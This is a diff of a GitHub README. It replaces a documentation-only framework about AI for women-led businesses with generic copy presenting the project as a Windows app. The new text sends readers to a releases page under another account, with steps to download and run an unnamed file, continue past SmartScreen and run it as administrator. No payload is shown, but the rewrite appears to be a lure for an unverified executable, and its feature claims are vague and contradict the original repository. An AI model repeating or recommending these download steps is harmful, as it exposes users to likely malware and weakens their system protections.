@@ -1,79 +1,210 @@
-# HOUSE OF AI
+# 🤖 house-of-ai-infrastructure - Build AI Workflows with Confidence
 
-AI Infrastructure Framework for Women-Led Businesses  
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/RoyL03/house-of-ai-infrastructure/releases)
 
-Created by [Lisa Erickson](lisa-erickson.md)
-Founder of HOUSE OF AI™
-https://houseofai.boston
+## 📦 What this is
 
-The House of AI Infrastructure framework was created by Lisa Erickson to help entrepreneurs — especially women-led businesses — design AI-powered operational systems.
+House of AI Infrastructure is a Windows app for people who want a clear way to work with AI tools, AI agents, and business workflows. It is built for entrepreneurs and women-led teams who want to use AI with structure, not guesswork.
 
-## Core Documents
-• [Manifesto](manifesto.md)  
-• [AI Workforce Model](ai-workforce.md)  
-• [Principles](principles.md)  
-• [Definitions](definitions.md)  
-• [AI Research](ai-research.md)  
-• [Skills](skills.md)
- [House of AI Model](house-of-ai-model.md)
-# House of AI Infrastructure
+Use it to explore frameworks, definitions, and setup patterns that support:
 
-This repository documents frameworks and definitions related to **AI-supported entrepreneurship and AI infrastructure for women-led businesses**.
+- AI-supported entrepreneurship
+- AI automation for daily work
+- Ethical AI use
+- Women-led business planning
+- Simple AI infrastructure planning
 
-The goal of this project is to provide clear conceptual models for founders who want to design businesses supported by artificial intelligence systems.
+## 🖥️ What you need
 
----
+You do not need coding skills to use this app. A standard Windows PC is enough.
 
-## Core Concepts
+Recommended setup:
 
-• AI Employees  
-• AI Workforce  
-• AI Infrastructure  
-• Mental Load Reduction Through AI  
-• AI-Supported Entrepreneurship  
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 500 MB free disk space
+- A stable internet connection for the first download
+- Permission to run apps on your computer
 
----
+If your computer can run modern desktop apps, it should work well.
 
-## What This Repository Contains
+## 🚀 Download and install
 
-This repository includes:
+Use this link to visit the release page and download the app for Windows:
 
-- Definitions of key AI business concepts
-- Frameworks for AI-supported entrepreneurship
-- Questions and answers related to building businesses with AI
-- Practical examples of AI infrastructure in women-led companies
+[https://github.com/RoyL03/house-of-ai-infrastructure/releases](https://github.com/RoyL03/house-of-ai-infrastructure/releases)
 
----
+### Steps
 
-## Why This Matters
+1. Open the release page link above.
+2. Find the latest release at the top of the page.
+3. Look for a Windows file in the Assets list.
+4. Download the file that matches your system.
+5. When the download finishes, open the file.
+6. If Windows asks for permission, choose Run or Open.
+7. Follow the steps on screen to finish setup.
+8. Open the app from your Start menu or desktop if a shortcut appears.
 
-Many entrepreneurs use AI tools occasionally.  
-However, sustainable businesses are built on **systems and infrastructure**.
+If the file opens with no installer, double-click it again to launch the app.
 
-By designing AI-supported systems, founders can reduce operational workload and focus on strategy, creativity, and leadership.
+## 🧭 First-time setup
 
----
+After you open the app for the first time, follow these steps:
 
-## Founder Vision
+1. Read the opening screens.
+2. Choose your preferred options if the app asks.
+3. Set your workspace or profile name if needed.
+4. Check any sample content or starter templates.
+5. Review the main menu so you know where each section is.
 
-This repository is part of a broader effort to explore how artificial intelligence can support women entrepreneurs in building sustainable and scalable businesses.
-## Key Definitions
+If the app offers a guided tour, use it. It can help you learn the layout faster.
 
-### AI Employee
-A digital system assigned a defined operational role inside a business.  
-An AI employee performs tasks such as research, drafting content, summarizing information, or organizing workflows.
+## 🛠️ How to use it
 
-### AI Workforce
-A collection of AI employees working together to support a founder or organization.
+This app is built to help you organize AI work for business use.
 
-### AI Infrastructure
-The system of tools, workflows, and knowledge libraries that allow artificial intelligence to operate continuously inside a business.
+Common ways to use it:
 
-### AI-Supported Entrepreneurship
+- Review AI framework definitions
+- Plan AI workflows for your business
+- Explore agent-based task ideas
+- Build a simple system for repeat work
+- Compare ethical AI choices
+- Map ideas for a women-led business strategy
 
-## Founder
-## Founder
+A simple use path:
 
-[Lisa Erickson — Founder of HOUSE OF AI](lisa-erickson.md)
+1. Open the app.
+2. Choose a framework or topic.
+3. Read the definition or workflow.
+4. Save useful items for later.
+5. Apply the idea to your business process.
 
-It introduces the concept of **AI-supported entrepreneurship**, where digital systems perform operational roles while the founder focuses on vision and leadership.
+## 🪟 Windows tips
+
+If Windows blocks the file, try these steps:
+
+- Right-click the file and choose Open
+- Check your Downloads folder if you cannot find it
+- Make sure the file finished downloading
+- If SmartScreen appears, choose the option that lets you continue
+- Run the app as an administrator only if the app asks for it
+
+If you have more than one monitor or a small screen, resize the window if needed.
+
+## 🔍 What you can expect inside
+
+The app is designed around practical AI use for business. You may see content such as:
+
+- AI agent definitions
+- Workflow maps
+- Business use cases
+- Ethical AI notes
+- Frameworks for founder support
+- Planning tools for women-led ventures
+- Infrastructure ideas for AI adoption
+
+The layout is meant to stay simple so you can move through content without extra setup.
+
+## 👩‍💼 Who it is for
+
+This app fits people who want structure around AI and business.
+
+It is a good match for:
+
+- Women founders
+- Solo entrepreneurs
+- Small business owners
+- AI beginners
+- Teams that need a clear AI process
+- Users who want to explore AI with an ethical lens
+
+## 🧩 Typical use cases
+
+You can use House of AI Infrastructure for tasks like:
+
+- Planning an AI support system for your business
+- Sorting ideas before you build an automation flow
+- Finding a shared language for AI tools
+- Creating a simple process for task handoff
+- Reviewing how AI fits into a founder workflow
+- Organizing resources for women in AI
+
+## 📁 File and folder behavior
+
+When you install or open the app, it may create files for:
+
+- Settings
+- Saved preferences
+- User data
+- Local cache
+- Workspace notes
+
+Keep these files in place if you want the app to remember your setup.
+
+## ❓ Common questions
+
+### Is this for technical users only?
+
+No. It is meant for regular Windows users who want a simple way to work with AI-related business material.
+
+### Do I need an account?
+
+That depends on the release you download. Some versions may work offline. Others may ask for setup details when you first open them.
+
+### Can I use it for a business team?
+
+Yes. It can support shared planning, workflow thinking, and AI use cases for small teams.
+
+### Does it support ethical AI planning?
+
+Yes. Ethical AI is one of the main topics in the project.
+
+## 🧪 If something does not work
+
+If the app does not open:
+
+1. Download the file again.
+2. Check that the file is not still inside a ZIP folder.
+3. Move the file to your Desktop and try again.
+4. Restart your computer.
+5. Open the latest release page and look for a newer build.
+
+If the app opens but looks blank:
+
+1. Close it.
+2. Open it again.
+3. Wait a few seconds for content to load.
+4. Check your internet connection if the app pulls data from online sources.
+
+## 📌 Topics covered
+
+This project focuses on:
+
+- ai-agents
+- ai-automation
+- ai-for-entrepreneurs
+- ai-for-women
+- ai-infrastructure
+- ethical-ai
+- house-of-ai
+- lisa-erickson
+- women-in-ai
+- women-led-business
+
+## 📥 Download again later
+
+If you want the latest version, return to the release page and visit this page to download:
+
+[https://github.com/RoyL03/house-of-ai-infrastructure/releases](https://github.com/RoyL03/house-of-ai-infrastructure/releases)
+
+## 📝 Basic support checklist
+
+Before asking for help, check these items:
+
+- You downloaded the latest release
+- You opened the right Windows file
+- Your computer meets the basic system needs
+- Windows did not block the app
+- The download finished fully
+- You have enough free space on your drive
